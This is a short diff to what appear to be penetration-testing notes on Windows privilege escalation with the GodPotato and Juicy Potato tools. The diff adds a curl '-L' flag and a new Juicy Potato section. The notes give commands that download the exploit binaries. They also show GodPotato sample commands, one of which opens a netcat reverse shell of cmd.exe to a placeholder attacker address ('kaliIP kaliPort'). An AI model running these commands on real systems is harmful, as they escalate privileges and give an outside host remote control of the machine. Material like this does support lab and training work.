@@ -13,11 +13,15 @@ Whoami
 
 # Method 2 - GodPotato
 -Download correct version of GodPotato exe to windows from https://github.com/BeichenDream/GodPotato/releases
-curl https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -o god.exe
+curl -L https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -o god.exe
 -Execute GodPotato exe file Sample Commands
 C:\Users\rob>god.exe -cmd "cmd /c whoami"
 C:\Users\rob>god.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe kaliIP kaliPort"
 
+# Method 3 - Juicy POtato
+-Download correct version of JuicyPotato exe to windows from https://github.com/ohpe/juicy-potato/releases
+curl -L https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -o jp.exe
+-Execute JuicyPotato exe file Sample Commands
 
 ************************************************************************************************************************************************
 ************************************************************************************************************************************************
